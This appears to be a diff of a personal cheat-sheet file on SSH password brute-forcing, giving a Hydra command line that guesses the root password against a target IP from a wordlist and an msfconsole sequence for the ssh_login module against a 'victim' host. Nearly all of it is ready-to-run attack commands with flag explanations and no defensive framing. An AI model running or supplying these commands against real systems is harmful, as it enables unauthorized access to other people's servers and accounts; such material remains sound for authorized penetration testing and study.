@@ -1,17 +1,17 @@
 ##################################
 #####BRUTE FORCE ATTACK###############
-#############VIA HYDRA#####################
+#############VIA HYDRA && MSF#####################
 ##################################
 
 HYDRA cmd:
-    #hydra -l root -P /usr/share/wordlists/metasploit/HereTheWantedListName ssh://IP:22 -t 4 -V
+    #hydra -l root -P /usr/share/wordlists/metasploit/HereTheWantedListName ssh://TargetIP:22 -t 4 -V
     -l == the user name that we want to discover the PASSWD
     -P == PASSWD Lists
     -t == number of attempt
     -V == Verbose mode
 
 
-#####BRUTE FORCE ATTACK via METASPLOIT###############
+#####SSH BRUTE FORCE ATTACK via METASPLOIT###############
 msf cmds:
     #msfconsole
     #msf6> search ssh (or directly ssh/ssh_login)
@@ -21,6 +21,8 @@ msf cmds:
     #msf6 moduleName > set pass_file /usr/share/wordlists/metasploit/HereTheWantedListName
     #msf6 moduleName > set RHOSTS VitcimsIP
     #msf6 moduleName > options (Check if every needed options are OK)
+    #msf6> set verbose true (To see the process)
+    #msf6> run
     
 
 
